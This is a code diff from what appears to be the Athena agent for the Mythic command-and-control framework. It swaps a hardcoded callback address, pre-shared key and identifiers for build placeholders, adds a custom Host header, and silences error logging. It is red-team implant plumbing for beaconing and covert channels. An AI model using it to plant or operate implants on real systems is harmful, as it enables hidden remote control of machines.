@@ -20,12 +20,12 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            this.uuid = "0279898a-ce13-4b13-8173-343747e4ab77";
-            DateTime kd = DateTime.TryParse("2022-10-05", out kd) ? kd : DateTime.MaxValue;
+            this.uuid = "%UUID%";
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("1", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("1", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
             this.smbForwarder = new SMBForwarder();
@@ -50,14 +50,14 @@ namespace Athena.Config
 
         public Websocket(string uuid)
         {
-            int callbackPort = Int32.Parse("8081");
-            string callbackHost = "ws://192.168.4.201";
-            this.endpoint = "socket";
+            int callbackPort = Int32.Parse("callback_port");
+            string callbackHost = "callback_host";
+            this.endpoint = "ENDPOINT_REPLACE";
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
-            this.psk = "1M1kIlmDATJag0M+MuvYzlq2G+skrS0JT6p5mQkU/d8=";
-            this.encryptedExchangeCheck = bool.Parse("false");
+            this.psk = "AESPSK";
+            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
@@ -65,6 +65,12 @@ namespace Athena.Config
             }
 
             this.ws = new ClientWebSocket();
+
+            if (!String.IsNullOrEmpty(this.hostHeader))
+            {
+                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
+            }
+
             Connect(callbackURL);
         }
 
@@ -87,9 +93,8 @@ namespace Athena.Config
                 }
                 return true;
             }
-            catch (Exception e)
+            catch
             {
-                Misc.WriteError(e.Message);
                 return false;
             }
         }
@@ -98,7 +103,6 @@ namespace Athena.Config
         {
             try
             {
-
                 string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
@@ -108,7 +112,6 @@ namespace Athena.Config
                 {
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
-
 
                 WebSocketMessage m = new WebSocketMessage()
                 {
@@ -138,9 +141,8 @@ namespace Athena.Config
                     return Misc.Base64Decode(m.Data).Substring(36);
                 }
             }
-            catch (Exception e)
+            catch
             {
-                Misc.WriteError(e.Message);
                 return "";
             }
         }
@@ -172,9 +174,8 @@ namespace Athena.Config
 
                 return "";
             }
-            catch (Exception e)
+            catch
             {
-                Misc.WriteError(e.Message);
                 return "";
             }
         }
